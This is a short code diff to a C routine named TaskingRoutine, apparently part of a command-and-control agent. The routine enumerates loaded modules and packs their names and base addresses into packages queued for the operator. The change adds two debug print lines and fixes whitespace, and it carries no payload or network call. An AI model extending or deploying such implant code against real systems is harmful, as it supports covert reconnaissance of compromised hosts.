@@ -104,6 +104,8 @@ void TaskingRoutine() {
 
 		    					AddStringToPackage(pPackage, ModuleNameA);
 		    					AddPtrToPackage(pPackage, CurrentModule.DllBase);
+		    					printf("[info] module name: %s\n", ModuleNameA);
+		    					printf("[info] module base: %p\n", CurrentModule.DllBase);
 		    				}
 
 							MemorySet(ModuleNameW, 0, MAX_PATH);
@@ -130,7 +132,7 @@ void TaskingRoutine() {
 			break;
         }
     	if(pPackage != NULL) {
-    		if(  pPackage->Length > 0) {
+    		if( pPackage->Length > 0) {
     			printf("[info] adding package to package list with size of 0x%04X\n", pPackage->Length);
     			AddInt32ToBuffer(pPackage->Buffer, pPackage->Length);
     			AddPackageToAgentPackageList(pPackage);
